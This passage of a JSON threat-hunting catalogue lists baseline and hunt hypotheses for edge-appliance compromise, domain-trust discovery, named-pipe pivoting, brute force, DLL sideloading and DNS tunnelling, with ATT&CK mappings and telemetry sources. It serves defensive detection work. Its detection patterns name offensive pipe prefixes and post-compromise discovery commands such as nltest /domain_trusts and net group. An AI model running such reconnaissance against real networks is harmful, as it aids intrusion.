periodic config/FIM snapshots (osquery where supported). **Build the allowlist**: per appliance, the set of (expected admin accounts + auth methods + source IP-ASN-geo), the (known-good cron/rc/sudoers state), and the (allowed outbound destinations). **Deliverable format**: a per-appliance baseline of `(expected accounts, auth methods, normal source IPs/geo/hours, known-good cron+rc+sudoers hash, allowed outbound endpoints)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) a built-in/default service account (`egnyteservice` etc.) authenticating interactively or from the SSL VPN IP range — see T1078.001; (b) any change to `/etc/crontab`, `/etc/cron.d/*`, or `/etc/rc.d/*` — see [[H184]]; (c) any sudoers entry allowing a service account to run `tee`/editors as root (T1548.003); (d) any outbound WebSocket/HTTPS or DNS-over-HTTPS from an appliance management IP to a non-vendor (e.g. Cloudflare-fronted) destination — see [[H185]]; (e) appliance admin interface newly reachable from the public internet. This baseline directly enables [[H184]] (cron/rc persistence) and [[H185]] (BRICKSTORM web C2). Cross-ref **T1133** (External Remote Services — the SSL VPN as SSH source), **T1199** (Trusted Relationship — the MSP-compromise entry vector), **T1548.003** (sudo privesc), **T1037.004** (rc-script persistence).",
    "tags": [
      "baseline",
      "linux",
      "edge_appliance",
      "firewall",
      "nas",
      "default_accounts",
      "brickstorm",
      "verdantbamboo",
      "T1078.001"
    ],
    "techniques": [
      "T1078.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Edge appliances are the highest-value, least-instrumented hosts in most networks — they hold credentials, terminate VPNs, and route traffic, yet run no EDR — which is exactly why VerdantBamboo lived on them undetected for 18+ months. The only realistic detection strategy on an EDR-blind device is a baseline of normal management access and normal device state, then alerting on deviation.\n- Default and built-in service accounts (like `egnyteservice`) are the crux: they exist on every unit, rarely log in interactively, and are perfect for an attacker with stolen MSP credentials. Baselining which accounts authenticate, how, and from where turns \"a service account logged in over SSH from the VPN\" into a one-line high-signal alert instead of an invisible event.\n- The baseline is what makes the paired Flames hunts ([[H184]], [[H185]]) operational: a known-good snapshot of cron/rc/sudoers and of the appliance's tiny legitimate outbound profile lets persistence changes and web/DoH C2 stand out immediately, because the legitimate state of an appliance is far more static than that of a general-purpose host.\n- Investing in an appliance management-plane baseline pays back across the entire edge attack surface and survives this actor's per-device customization and C2 rotation, because it describes the org's normal device state and admin behavior rather than chasing rotating BRICKSTORM hashes and Cloudflare-fronted domains.",
    "references": "- [MITRE ATT&CK T1078.001 - Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [CISA - Edge Device Security (best practices and hunting)](https://www.cisa.gov/topics/cybersecurity-best-practices/edge-device-security)\n- [CISA - Guidance and strategies to protect network edge devices](https://www.cisa.gov/resources-tools/resources/guidance-and-strategies-protect-network-edge-devices)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)\n- [MITRE ATT&CK T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/)\n- [pberba - Hunting for Persistence in Linux (Part 1): Auditd, Sysmon, Osquery](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/)",
    "file_path": "Embers/B022.md"
  },
  {
    "id": "B023",
    "category": "Embers",
    "title": "In the Deception.Pro multi-RAT intrusion, the operator performed SAMR and LSAD RPC\nenumeration against the domain controller to map domains, users, group memberships,\nand trust relationships before deciding on lateral movement. Because nltest, dsquery,\nAD-tooling, and management agents perform domain-trust enumeration as part of normal\noperations, an alert-first approach drowns in false positives. This baseline\ncharacterizes which hosts and accounts legitimately enumerate domain trusts (and via\nwhich mechanism — nltest CLI, LDAP trustedDomain queries, or SAMR/LSARPC named-pipe\naccess) so that trust discovery from a non-admin workstation, a recently-phished user\ncontext, or a host running an unsigned/uncommon binary stands out as anomalous.\n",
    "tactic": "Discovery",
    "notes": "Build a 30-day baseline of domain-trust-discovery activity, then deliver an allowlist of normal enumerators so the paired alert can fire only on deviations. DATA COLLECTION: (1) Process telemetry — Security EID 4688 / Sysmon EID 1 for image=nltest.exe with args /domain_trusts, /all_trusts, /dclist:, /dsgetdc:, /parentdomain, /trusted_domains; for dsquery/AdFind with LDAP filter (objectClass=trustedDomain) or (objectCategory=trustedDomain); and PowerShell Get-NetDomainTrust/Get-NetForestTrust/Get-ADTrust. Capture per event: host, ParentImage, account SID/name, account privilege level, command line, signing status. (2) DC-side RPC telemetry — Security EID 5145 (detailed file share) for RelativeTargetName in (lsarpc, samr, srvsvc, netlogon) over IPC$, plus EID 4661/4662 (handle to SAM/AD object, mass attribute enumeration) — source IP, source account, volume. (3) Sysmon EID 3 network connections to DC port 135 + ephemeral high ports from non-server hosts. AGGREGATE over a 30-DAY WINDOW per (source host, account, mechanism). DELIVERABLE: an ALLOWLIST of (host, account, tool) tuples that are baseline-normal — e.g. domain controllers, tier-0 admin jump hosts, vulnerability scanners, and AD management consoles — so anything outside it is investigable. IMMEDIATE-FLAG patterns (do not wait for baseline): nltest /domain_trusts or /all_trusts from a standard user workstation; SAMR+LSARPC+SRVSVC named-pipe access from one source within minutes (BloodHound/SharpHound signature); a spike of EID 4661 (SAMR enumeration) from a single source; trust enumeration whose ParentImage is a browser, mail client, Office app, certutil.exe, or a binary in C:\\Users\\Public\\. CROSS-REF: pairs with the RTLO masquerade Flames hunt [[H186]] — both are stages of the same SSA-phish-to-AdaptixC2 intrusion; an RTLO execution followed within the dwell window by trust discovery from the same host is a high-confidence chain.",
    "tags": [
      "discovery",
      "domain_trust_discovery",
      "nltest",
      "bloodhound",
      "samr",
      "lsarpc",
      "active_directory",
      "T1482"
    ],
    "techniques": [
      "T1482"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The Deception.Pro op report explicitly documents SAMR and LSAD RPC enumeration of domains, users, group memberships, and trust relationships as the discovery phase that informed the operator's lateral-movement decisions in a live multi-RAT intrusion.\n- Domain trust discovery is performed routinely by administrators, AD management tools, vulnerability scanners, and DC processes, so a naive alert generates excessive noise — a baseline of \"who normally enumerates trusts, from where, and how\" is required before the behavior is alert-able, which is the defining condition for an Embers (baseline) hunt.\n- The activity is observable through multiple complementary telemetry sources (nltest/dsquery/PowerShell process args, DC-side EID 5145 named-pipe access, EID 4661/4662 SAM/AD object enumeration, and Sysmon network connections), letting the baseline cover both CLI and RPC/BloodHound-style enumeration that LDAP-only auditing misses.\n- Trust discovery is a high-value pivot point: once an allowlist exists, deviations (non-admin host, phished user context, RTLO-payload parent) become a precise tripwire — and correlating it with the paired RTLO hunt [[H186]] reconstructs the full intrusion chain.",
    "references": "- [MITRE ATT&CK T1482 - Domain Trust Discovery](https://attack.mitre.org/techniques/T1482/)\n- [[Op Report] From SSA Phish to AdaptixC2: A Multi-RAT Intrusion - Deception.Pro](https://blog.deception.pro/blog/xworm-sc-hok-may-2026)\n- [Splunk Lantern - Detecting domain trust discovery attempts](https://lantern.splunk.com/Splunk_Platform/Use_Cases/Use_Cases_Security/Threat_Hunting/Detecting_domain_trust_discovery_attempts)\n- [Splunk Security Content - NLTest Domain Trust Discovery](https://research.splunk.com/endpoint/c3e05466-5f22-11eb-ae93-0242ac130002/)\n- [Elastic Security - Enumerating Domain Trusts via NLTEST.EXE](https://www.elastic.co/guide/en/security/8.19/prebuilt-rule-8-3-1-enumerating-domain-trusts-via-nltest-exe.html)\n- [Atomic Red Team - T1482 Domain Trust Discovery](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md)\n- [Compass Security - BloodHound Inner Workings: SAMR & LSARPC enumeration](https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/)",
    "file_path": "Embers/B023.md"
  },
  {
    "id": "B024",
    "category": "Embers",
    "title": "SPECTRALVIPER's orchestrator instance distributes commands to other compromised hosts over named pipes (XGU::Pivot::StartLink / WaitNew_RemotePipe), so an anomalous named pipe — one connecting hosts that have never communicated via IPC before, or a pipe name absent from the environment's 30-day baseline — indicates OceanLotus lateral pivoting / tool-and-command transfer.",
    "tactic": "Lateral Movement",
    "notes": "Windows. Collection: Sysmon EID 17 (PipeCreated) and EID 18 (PipeConnected) — capture PipeName, Image, ProcessGuid, User, Computer; plus Security EID 5145 (detailed file share) for ADMIN$/C$/IPC$ writes of EXE/DLL/scripts and EID 7045 (service install) for remote-exec follow-on. Establish a 30-day baseline of normal PipeName values and the Images that create/connect them per host role (DCs, workstations, servers differ). Deliverable allowlist: enumerate expected pipes — OS/AV/EDR/RMM/SQL/print/RPC pipes (\\\\srvsvc, \\\\lsass, \\\\winreg, \\\\spoolss, \\\\ntsvcs, \\\\epmapper, \\\\PSEXESVC for sanctioned PsExec) — and the signed Images that own them. Immediate flags (do not wait for baseline): high-entropy/random or GUID-like pipe names; pipes created by unsigned images or by images in %TEMP%/%APPDATA%/%PUBLIC%; the same pipe name appearing across multiple hosts in a short window (orchestrator fan-out pattern); a pipe-creating process that is a renamed signed binary (cross-ref [[H187]]); known offensive pipe patterns (\\\\msagent_*, \\\\postex_*, \\\\status_*, \\\\MSSE-*, \\\\win_svc*, \\\\UIA_PIPE*). Correlate pipe activity with EID 5145 admin-share file writes occurring within minutes on the same source->dest pair to catch actual tool transfer. Cross-ref paired Flames [[H187]] (the side-loaded SPECTRALVIPER binary is what owns these pipes). Tune by promoting baselined PipeName+Image pairs to an allowlist and re-baselining quarterly.",
    "tags": [
      "lateral_movement",
      "named_pipes",
      "oceanlotus",
      "apt32",
      "spectralviper",
      "windows",
      "sysmon",
      "pivoting",
      "T1570"
    ],
    "techniques": [
      "T1570"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ESET documents SPECTRALVIPER using a named-pipe orchestration layer (`XGU::Pivot::StartLink`, `XGU::Pivot::Internal::WaitNew_RemotePipe`) so one orchestrator instance distributes commands to other compromised hosts — a textbook lateral tool/command transfer over IPC.\n- Named pipes are heavily used by legitimate Windows IPC, so a blind detection drowns in noise; a per-environment 30-day baseline of pipe names and owning images is required to make the anomaly visible — hence Embers, not Flames.\n- The orchestrator fan-out (same pipe name surfacing across multiple hosts in a short window) and pipes owned by unsigned or non-standard-path images are high-signal deviations that survive baselining.\n- Pairing pipe events (Sysmon 17/18) with admin-share writes (EID 5145) catches the moment tools are actually transferred, satisfying the T1570 lateral-tool-transfer hypothesis rather than pipe creation alone.",
    "references": "- [MITRE ATT&CK T1570 — Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/)\n- [source report — OceanLotus: From external espionage to domestic targeting (ESET)](https://www.welivesecurity.com/en/eset-research/oceanlotus-external-espionage-domestic-targeting/)\n- [Splunk — Detecting & Hunting Named Pipes](https://www.splunk.com/en_us/blog/security/named-pipe-threats.html)\n- [Detect.FYI — Threat Hunting: Suspicious Named Pipes (mthcht)](https://detect.fyi/threat-hunting-suspicious-named-pipes-a4206e8a4bc8)\n- [Atomic Red Team — T1570 Lateral Tool Transfer](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.md)\n- [Hunting & Detecting SMB Named Pipe Pivoting (Lateral Movement)](https://bherunda.medium.com/hunting-detecting-smb-named-pipe-pivoting-lateral-movement-b4382bd1df4)",
    "file_path": "Embers/B024.md"
  },
  {
    "id": "H001",
    "category": "Flames",
    "title": "An adversary is attempting to brute force the admin account on the externally facing VPN gateway.",
    "tactic": "Credential Access",
    "notes": "Attackers want to gain initial access through elevated credentials and move laterally",
    "tags": [
      "credentialaccess",
      "bruteforce",
      "vpn",
      "T1110"
    ],
    "techniques": [
      "T1110"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://x.com/letswastetime"
    },
    "why": "- The admin account on an externally facing VPN gateway provides significant control over network access, making it a prime target for adversaries.\n- Successful brute force attacks on this account could lead to unauthorized access to the internal network, bypassing other security controls.\n- Brute force attempts on the VPN gateway may be part of a larger campaign targeting critical infrastructure, necessitating immediate investigation and response.",
    "references": "- https://attack.mitre.org/techniques/T1110/\n- https://medium.com/threatpunter/okta-threat-hunting-tips-62dc0013d526",
    "file_path": "Flames/H001.md"
  },
  {
    "id": "H002",
    "category": "Flames",
    "title": "Adversaries are abusing response features included in EDR and other defensive tools that enable remote access.",
    "tactic": "Command and Control",
    "notes": "Attackers are very interested in using commercial tools or similar to \"live off the land\"",
    "tags": [
      "commandandcontrol",
      "remoteaccess",
      "edr",
      "lolbin",
      "T1219"
    ],
    "techniques": [
      "T1219"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://x.com/letswastetime"
    },
    "why": "- Identify non-approved or malicious EDRs used by threat actors for persistence, surveillance, or launching internal attacks.\n- Fill gaps in monitoring by proactively searching for artifacts and signals that standard tools might miss, improving detection of potential threats.\n- Uncover and stop attackers from repurposing legitimate EDRs or deploying fraudulent instances for malicious purposes.",
    "references": "- https://attack.mitre.org/techniques/T1219/\n- https://x.com/jamieantisocial/status/1829617254860013981\n- https://github.com/cbecks2/edr-artifacts/tree/main",
    "file_path": "Flames/H002.md"
  },
  {
    "id": "H003",
    "category": "Flames",
    "title": "An adversary has exfiltrated data off backup servers into small (1MB) .zip files.",
    "tactic": "Exfiltration",
    "notes": "Attackers often need to get data out, 1MB chunks sneak beneath big file anomaly detection. Consider different file sizes and types based on normal in your environment.",
    "tags": [
      "exfiltration",
      "T1030",
      "T1560.001"
    ],
    "techniques": [
      "T1030",
      "T1560.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Adversaries often need to take data in order to extort companies for money.\n- Data transfer limits and monitoring are effective controls for stopping malware, data loss, and other nefarious activities. \n- Breaking data up into small chunks sticks below transfer limits, and using .zip files allows adversaries to blend in with normal traffic.",
    "references": "- https://attack.mitre.org/techniques/T1030/\n- https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a\n- https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF",
    "file_path": "Flames/H003.md"
  },
  {
    "id": "H004",
    "category": "Flames",
    "title": "An adversary is leveraging BITSAdmin jobs to download and execute payloads.",
    "tactic": "Persistence",
    "notes": "Attackers are interested in using living off the land binaries (LOLbin) to evade detection.",
    "tags": [
      "persistence",
      "lolbin",
      "windows",
      "T1197"
    ],
    "techniques": [
      "T1197"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- BITSAdmin is a tool preinstalled on Windows operating systems.\n- BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.\n- Often used by IT Administrators",
    "references": "- https://attack.mitre.org/techniques/T1197/\n- https://redcanary.com/blog/threat-detection/bitsadmin/",
    "file_path": "Flames/H004.md"
  },
  {
    "id": "H005",
    "category": "Flames",
    "title": "An adversary is establishing persistence on Linux hosts by executing commands triggered by a user's shell via .bash_profile, .bashrc, and .bash_login/logout.",
    "tactic": "Persistence",
    "notes": "Attackers are interested in using living off the land binaries and scripts (LOLBAS) to evade detection.",
    "tags": [
      "persistence",
      "lolbas",
      "linux",
      "T1546.004"
    ],
    "techniques": [
      "T1546.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- .bash_profile, .bashrc, .bash_login scripts execute when a user opens a cli or connects remotely. \n- .bash_logout (if it exists) scripts execute when a user exits a session or logs ourt of an interactive login shell session like SSH. \n-  Often used by IT Administrators to execute scripts at user logon",
    "references": "- https://attack.mitre.org/techniques/T1546/004/\n- https://pberba.github.io/security/2022/02/06/linux-threat-hunting-for-persistence-initialization-scripts-and-shell-configuration/",
    "file_path": "Flames/H005.md"
  },
  {
    "id": "H006",
    "category": "Flames",
    "title": "After compromising an initial asset, an adversary may attempt to pivot to access additional resources within a victim network.",
    "tactic": "Lateral Movement",
    "notes": "Adversaries often abuse legitimate remote access features (such as RDP and SSH) already enabled in the environment.",
    "tags": [
      "lateralmovement",
      "sus",
      "T1021"
    ],
    "techniques": [
      "T1021"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jamie Williams",
      "link": "https://x.com/jamieantisocial"
    },
    "why": "- Adversaries may seek access beyond the initially compromised asset (i.e., to steal additional data, deploy ransomware, etc.)\n- Legitimate remote access features may be abused by adversaries, and may also extend between network boundaries (i.e., on-prem to cloud)\n    - Commonly abused remote protocols include:\n        - Remote Desktop Protocol (RDP), destination port `3389` ([T1021.001](https://attack.mitre.org/techniques/T1021/001/))\n        - Server Message Block (SMB), destination ports `139` or `445` ([T1021.002](https://attack.mitre.org/techniques/T1021/002/))\n        - Secure Shell (SSH), destination port `22` ([T1021.004](https://attack.mitre.org/techniques/T1021/004/))\n        - Windows Management Instrumentation (WMI), destination ports `135` or `5985`/`5986` ([T1047](https://attack.mitre.org/techniques/T1047/))\n- Abuse of these features is often leveraging legitimate user credentials ([T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)), so tracing the activity of known-compromised accounts may also highlight potential lateral movement activity\n- Analyzing adversary enumeration commands may also shed light on potential lateral movement activity (i.e., what assets did the adversary discover during [T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/)?)",
    "references": "- [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/)\n- [Windows Security Log Event ID 4624: An account was successfully logged on](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624)",
    "file_path": "Flames/H006.md"
  },
  {
    "id": "H007",
    "category": "Flames",
    "title": "After compromising a host, adversaries may attempt to execute malicious commands to complete additional tasks.",
    "tactic": "Execution",
    "notes": "Adversaries often abuse legitimate command interpreters/applications, such as CMD, PowerShell, or bash/zsh.",
    "tags": [
      "execution",
      "sus",
      "T1059"
    ],
    "techniques": [
      "T1059"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jamie Williams",
      "link": "https://x.com/jamieantisocial"
    },
    "why": "- Adversaries often abuse accessible terminal/shell applications to execute post-compromise tasks\n- Malicious command execution may be identifiable by characteristics of the:\n  - command (e.g., `whoami` or other rare [Discovery](https://attack.mitre.org/tactics/TA0007/) activity) as well as attempts to obfuscate executed commands ([T1027.010 - Obfuscated Files or Information: Command Obfuscation](https://attack.mitre.org/techniques/T1027/010/))\n  - user/host (e.g., does`{person}` in `{department}` ever execute admin commands like this?)\n  - command -- adversaries/malware typically execute very common [Discovery](https://attack.mitre.org/tactics/TA0007/) commands that may also be rare for your environment (especially when executed in succession), such as:\n      - `whomai`\n      - `ipconfig /all`\n      - `nltest /domain_trusts`\n      - `net localgroup administrators`\n      - `net group \"Domain Computers\" /domain`\n      - `systeminfo`\n      - `route print`\n      - `net view /all`\n      - `net config workstation`\n\n      *source: [The DFIR Report](https://thedfirreport.com/)\n  - attempts to obfuscate executed commands ([T1027.010 - Obfuscated Files or Information: Command Obfuscation](https://attack.mitre.org/techniques/T1027/010/)\n      - Check out [M005](https://github.com/triw0lf/THOR/blob/main/Hunts/Model-Assisted/M005.md)!\n- user/host (e.g., does`{person}` in `{department}` ever execute admin commands like this?)\n- command/process lineage (e.g., why are `PowerShell.exe` processes spawning from Outlook...?)\n\n- Malicious commands may also be executed from script files or [common admin tools](https://github.com/BushidoUK/Ransomware-Tool-Matrix/blob/main/Tools/DiscoveryEnum.md), so consider also investigating newly created files ([T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)) referenced in suspicious commands\n- **Note:** Consider baselining and comparing instances of suspicious command execution against known false positives (e.g., [WTFBins](https://wtfbins.wtf/))",
    "references": "- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)\n- [LOLBAS Cmd.exe](https://lolbas-project.github.io/lolbas/Binaries/Cmd/)\n- [GTFOBins bash](https://gtfobins.github.io/gtfobins/bash/)\n- [GTFOBins zsh](https://gtfobins.github.io/gtfobins/zsh/)\n- [The DFIR Report](https://thedfirreport.com/)\n- [Ransomware-Tool-Matrix](https://github.com/BushidoUK/Ransomware-Tool-Matrix)",
    "file_path": "Flames/H007.md"
  },
  {
    "id": "H008",
    "category": "Flames",
    "title": "Adversaries may create domain accounts to maintain access to systems with Active Directory.",
    "tactic": "Persistence",
    "notes": "Domain Accounts can cover user, administrator, and service accounts.",
    "tags": [
      "persistence",
      "activedirectory",
      "T1136.002"
    ],
    "techniques": [
      "T1136.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Audra Streetman",
      "link": "https://x.com/audrastreetman"
    },
    "why": "- Domain accounts \"may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system,\" according to MITRE ATT&CK.\n- Empire, PsExec, Pupy, and Net (net user /add /domain) are examples of tools, utilities and frameworks that can create a new domain user, if permissions allow.\n- This technique has been used by adversaries such as Sandworm in the 2015 and 2016 attacks targeting Ukraine's electric grid, and also in attacks attributed to the cybercriminal group Wizard Spider.",
    "references": "- https://attack.mitre.org/techniques/T1136/002/\n- https://github.com/0xAnalyst/CB-Threat-Hunting/blob/master/ATT%26CK/T1136.002%20-%20Domain%20Account%20Creation.md\n- https://www.splunk.com/en_us/blog/security/active-directory-discovery-detection-threat-research-release-september-2021.html",
    "file_path": "Flames/H008.md"
  },
  {
    "id": "H009",
    "category": "Flames",
    "title": "Attackers may exploit mshta.exe, a trusted Windows utility, to execute malicious .hta files as well as JavaScript or VBScript indirectly. Mshta.exe is designed to run Microsoft HTML Applications (HTA) files, which are stand-alone applications that operate independently of the browser but use the same frameworks and technologies as Internet Explorer. This utility's trusted status can make it a valuable tool for adversaries seeking to evade detection and execute code stealthily.",
    "tactic": "Defense Evasion",
    "notes": "Data requirements: Windows Sysmon, EDR telemetry, Proxy logs",
    "tags": [
      "defenseevasion",
      "systembinaryproxyexecutionmshta",
      "T1218.005"
    ],
    "techniques": [
      "T1218.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Azrara",
      "link": "https://www.linkedin.com/in/azrara/"
    },
    "why": "- Hunting for malicious mshta.exe activity provides critical early detection of potential threats by targeting a commonly exploited Windows utility that attackers use to evade security defenses.\n- This hunt improves threat visibility, enhances detection accuracy, and mitigates the risk of full-scale attacks by catching adversaries in the early stages.",
    "references": "- https://attack.mitre.org/techniques/T1218/005/\n- https://redcanary.com/threat-detection-report/techniques/mshta/",
    "file_path": "Flames/H009.md"
  },
  {
    "id": "H010",
    "category": "Flames",
    "title": "Adversaries may search for network shares on compromised systems to locate files of interest. Sensitive data can be gathered from remote systems via shared network drives (host-shared directories, network file servers, etc.) that are accessible from the current system before exfiltration.",
    "tactic": "Collection",
    "notes": "<ul><li>Data requirements: EDR telemetry, Windows event logs id 5140</li></br><li>Implementation examples in SIGMA:</li></br>Title: Suspicious Network Share Enumeration and Access</br>Id:xxxxx</br>Status: test</br>Description: Detects commands used for network share enumeration and correlates with Event ID 5140 for access to shared resources.</br>Author: Your Name</br>Date:2024/11/14</br>Tags:</br><ul><li>attack.discovery</br><li>attack.t1135</li></ul></br>logsource:</br>category: process_creation</br>product:windows</br>detection:</br>selection_cmd:</br>Image&#124;endswith:</br><ul><li>'\\cmd.exe'</br><li>'\\powershell.exe'</br>ComandLine&#124;contains&#124;all:</br><li>'net view'</br><li>'&bsol;'</br>selection_event:</br>EventID: 5140</br>condition: selection_cmd or selection_event</br>falsepositives:</br><li>Legitimate administrative tasks</br><li>Regular file-sharing activities</br>level: medium #T1039",
    "tags": [
      "collection",
      "datafromnetworkshareddrive",
      "T1039"
    ],
    "techniques": [
      "T1039"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Azrara",
      "link": "https://www.linkedin.com/in/azrara/"
    },
    "why": "- Hunting for adversarial activity involving network share exploration on compromised systems is crucial for detecting potential data theft early.\n- By monitoring access to shared network drives and tracking unusual usage of command shell functions, defenders can identify attempts to locate and collect sensitive data before it is exfiltrated.",
    "references": "- https://research.splunk.com/endpoint/4dc3951f-b3f8-4f46-b412-76a483f72277/\n- https://attack.mitre.org/techniques/T1039/",
    "file_path": "Flames/H010.md"
  },
  {
    "id": "H011",
    "category": "Flames",
    "title": "For sideloading a DLL into vulnerable binary, a threat actors would be dropping (creating) EXE and DLL files under user writeable directories and then executing the same newly created EXE file so that it loads the newly created and unverified (Dig sign unverified) DLL from the same directory.",
    "tactic": "Persistence, Privilege Escalation, Defense Evasion",
    "notes": "Limitations: There are no such limitations other than non-availability of required logs. Sometimes, we tend to not collect \"Module Load\" events due to their huge volume. In such case we would not be able to perform this hunt. Also, for correlation of data we need advance query language such as SQL, KQL or better enough if we can use Pandas.</br></br>Assumption: Assuming that threat actor is using standard user rights and is using a DLL that has unverifiable digital signature (DLL is signed but certificates are not verified).</br></br>Data sets required: EDR logs - \"File Creation\" and \"Module Load\" events.</br></br>Query creation steps:</br></br>1. Select .dll File Creation Events: From the \"File Creation\" logs, select all .dll file creation events. Ensure that the folder path of the newly created .dll file is not among the following: c:\\windows\\system32, c:\\windows\\syswow64, and c:\\windows\\sxs. Additionally, the verification status of the .dll file should be \"Not Verified\".</br></br>2. Select .exe File Creation Events: Next, from the \"File Creation\" logs, select all .exe file creation events. The condition for selection is that the folder path of the .exe file matches the folder path of the .dll files identified in the previous step. Furthermore, the absolute time difference between the .dll file creation event and the .exe file creation event should be less than one minute.</br></br>3. Select DLL Load Events: Finally, from the \"Module Load\" logs, select all DLL load events where the file name and path of the loaded DLL and the file name and path of the EXE loading that DLL match the names and paths of the .dll and .exe files identified in the previous steps. Additionally, the time of the module load event should be greater than the time of the DLL creation event.",
    "tags": [
      "persistence",
      "privilege_escalation",
      "defense_evasion",
      "dllsideloading",
      "T1574.002"
    ],
    "techniques": [
      "T1574.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "hu983r",
      "link": "https://github.com/Communicateme"
    },
    "why": "- What security risks or threats does this hunt address?</br>This hunt addresses the security risk of DLL sideloading, a technique where attackers exploit the Windows DLL search order to load malicious DLLs instead of legitimate ones. This can be used to execute arbitrary code, escalate privileges, or maintain persistence within a compromised system1.\n- What are the potential impacts if malicious activity is found?</br>If malicious activity is found, it could lead to data breaches, unauthorized access to sensitive information, and potential disruption of critical services. Attackers could gain control over the system, leading to further exploitation and compromise of additional assets.\n- How does this hunt connect to known threat campaigns or protect critical assets?</br>This hunt is connected to known threat campaigns such as those conducted by APT41, APT41 (also known as Winnti Group), and other advanced threat actors. By detecting DLL sideloading attempts, organizations can protect critical assets like sensitive data, intellectual property, and critical infrastructure from being compromised.\n- Why would this hunt be valuable to the community?</br>This DLL sideloading technique is particularly valuable because it is often missed by Endpoint Detection and Response (EDR) systems. This is due to the fact that DLL sideloading can masquerade as legitimate application behavior, making it difficult for EDRs to differentiate between benign and malicious activity. Attackers exploit trusted binaries to load their malicious DLLs, effectively bypassing security controls.\nBy conducting hunts specifically targeting this behavior, we can identify and mitigate threats that would otherwise go undetected by traditional EDR solutions. This proactive approach helps the community to enhance their detection capabilities, protect critical assets, and reduce the overall risk of a security breach.",
    "references": "- https://attack.mitre.org/techniques/T1574/002/\n- https://www.group-ib.com/blog/hunting-rituals-dll-side-loading/\n- https://www.cybereason.com/blog/threat-analysis-report-dll-side-loading-widely-abused",
    "file_path": "Flames/H011.md"
  },
  {
    "id": "H012",
    "category": "Flames",
    "title": "An adversary is utilizing DNS tunneling to exfiltrate data through DNS port 53.",
    "tactic": "Exfiltration",
    "notes": "Attackers are interested in finding unmonitored communication channels to evade detection.",
    "tags": [
      "dns",
      "tunneling",
      "exfiltration",
      "T1048",
      "T1071.004"
    ],
    "techniques": [
      "T1048",
      "T1071.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Cody Lunday",
      "link": "https://www.linkedin.com/in/codylunday/"
    },
    "why": "- DNS is commonly ignored or lightly monitored by enterprise defense strategies.\n- DNS tunneling exploits may give attackers an accessible backchannel to exfiltrate stolen information.\n- DNS provides a covert means of correspondence to bypass firewalls.",
    "references": "- https://attack.mitre.org/techniques/T1048/\n- https://www.socinvestigation.com/threat-hunting-using-dns-logs-soc-incident-response-procedure/\n- https://brightsec.com/blog/dns-tunneling/\n- https://blueteamresources.in/detect-and-investigate-dns-tunneling/",
    "file_path": "Flames/H012.md"
  },
  {
    "id": "H013",
    "category": "Flames",
    "title": "Attackers often utilize PowerShell, a powerful scripting language available on Windows systems, to execute malicious commands, download additional payloads, or manipulate system configurations. Detecting the execution of unauthorized or suspicious PowerShell scripts is crucial, as it may indicate the presence of an adversary attempting to compromise the system. Native windows Event ID 4104 is crucial to detect suspicious script executions.",
    "tactic": "Execution",
